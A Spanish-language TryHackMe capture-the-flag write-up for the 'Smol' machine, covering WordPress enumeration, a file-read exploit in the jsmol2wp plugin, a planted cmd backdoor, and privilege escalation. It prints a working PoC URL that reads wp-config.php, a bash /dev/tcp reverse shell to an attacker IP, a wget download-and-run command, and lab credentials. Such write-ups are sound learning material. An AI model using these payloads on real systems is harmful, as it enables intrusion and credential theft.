

# CTF Writeup – **Smol**

---
```shell
'Durante la fase de enumeración se revisó el archivo de grupos del sistema:
`cat /etc/group`' fue la clave para saber que podia saltar de usuario

```

```
Salida relevante:
internal:x:1005:diego,gege,think,xavi`

```

## 📋 Información General

| Campo          | Valor         |
| -------------- | ------------- |
| **Plataforma** | TryHackMe     |
| **Dificultad** | Easy          |
| **OS**         | Linux         |
| **IP**         | `10.10.6.178` |
| **Fecha**      | 26/01/2025    |


**Tags:** #ctf #tryhackme #wordpress #file-read #rce #privesc

---

## 🎯 Objetivo

-  User Flag
-  Root Flag
---

## 🔍 Reconocimiento

### Nmap Scan

**Comando:**

`nmap -sC -sV -oN nmap_inicial.txt 10.10.6.178`

**Resultado:**

`22/tcp open  ssh     OpenSSH (key-based auth only) 80/tcp open  http    Apache httpd`

### Puertos Abiertos

|Puerto|Servicio|Versión|
|---|---|---|
|22|SSH|Key-based auth|
|80|HTTP|Apache|

---

## 🌐 Enumeración Web

Se detecta un sitio WordPress en `http://smol.thm`.
```
wpscan --random-user-agent --enumerate ap,at,cb,dbe,u,m \ --plugins-version-detection aggressive \ --detection-mode aggressive \ --url http://www.smol.thm/`

```


### Hallazgos Importantes

#### Plugin vulnerable detectado

```
Plugin: jsmol2wp Version: 1.07 CVE: CVE-2018-20463

```

---

## 💣 Vulnerabilidad Crítica – Arbitrary File Read

### [VULN-001] Arbitrary File Read – jsmol2wp

**Severidad:** Crítica  
**CVE:** CVE-2018-20463

**Descripción:**

El plugin `jsmol2wp` permite controlar directamente el parámetro `query`, el cual es pasado sin validación a `file_get_contents()`.  
Esto habilita **lectura arbitraria de archivos** y SSRF.

---

### Evidencia (POC)
```
`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`

```


---

### Impacto

Se logró leer `wp-config.php`, obteniendo credenciales válidas:

`define('DB_USER', 'wpuser'); define('DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G');`

Esto permite:

- Acceso a la base de datos  
- Acceso al panel WordPress 
- Compromiso total de la aplicación web 

---

## 🚀 Explotación

### Initial Access – Acceso Inicial

**Vulnerabilidad explotada:** Arbitrary File Read (CVE-2018-20463)

#### Paso 1 – Acceso a WordPress

Con las credenciales obtenidas del `wp-config.php`, se accede exitosamente al panel administrativo de WordPress.

---

### Paso 2 – Descubrimiento de Backdoor

Dentro del panel se encuentra una página privada **“Webmaster Tasks!!”**, que indica revisar el plugin **Hello Dolly**.

Mediante lectura del archivo:

`php://filter/resource=../../hello.php`

Se identifica código malicioso ofuscado.

#### Código decodificado:

`if (isset($_GET["cmd"])) {     system($_GET["cmd"]); }`

Esto permite **ejecución remota de comandos (RCE)**.

---

### Paso 3 – Reverse Shell

#### Preparación del payload
```
`/bin/bash -i >& /dev/tcp/10.14.38.96/9090 0>&1`

Se guarda como archivo `revshell` y se sirve mediante HTTP.

```


---

#### Descarga del payload en la víctima
```
`http://www.smol.thm/wp-admin/index.php?cmd=wget%20http://10.14.38.96:9090/revshell%20-O%20/tmp/revshell`
```


---
```
#### Listener

`nc -lvnp 9090`

---

#### Ejecución de la shell

`http://www.smol.thm/wp-admin/index.php?cmd=bash%20/tmp/revshell`

---

### Shell obtenida

`www-data@smol:/var/www/wordpress/wp-admin$`

```


---

## 📈 Escalación de Privilegios

### Enumeración Inicial

Se accede a la base de datos WordPress y se extraen hashes:

`select user_login, user_pass from wp_users;`

Los hashes se crackean con John:

`john hashes --wordlist=/usr/share/wordlists/rockyou.txt`

Usuario comprometido:

`diego:sandiego`

---

### User Flag

`cat /home/diego/user.txt`

---

### Escalada a Root

Mediante acceso a backups antiguos (`wordpress.old.zip`) y reutilización de credenciales:

- Se obtiene contraseña del usuario `xavi`
    
- `xavi` tiene privilegios sudo completos
    

`sudo bash`

---

### Root Flag

`cat /root/root.txt`

---

## 🔑 Credenciales Encontradas

|Usuario|Contraseña|Ubicación|
|---|---|---|
|wpuser|kbLSF2Vop#lw3rjDZ629*Z%G|wp-config.php|
|diego|crackeada|wp_users|
|xavi|backup viejo|wordpress.old.zip|

---

## 💡 Lecciones Aprendidas

- Los plugins vulnerables siguen siendo un vector crítico
    
- Un solo **file read** puede llevar a **RCE**
    
- Plugins legítimos pueden estar **backdooreados**
    
- Backups antiguos son oro puro para un atacante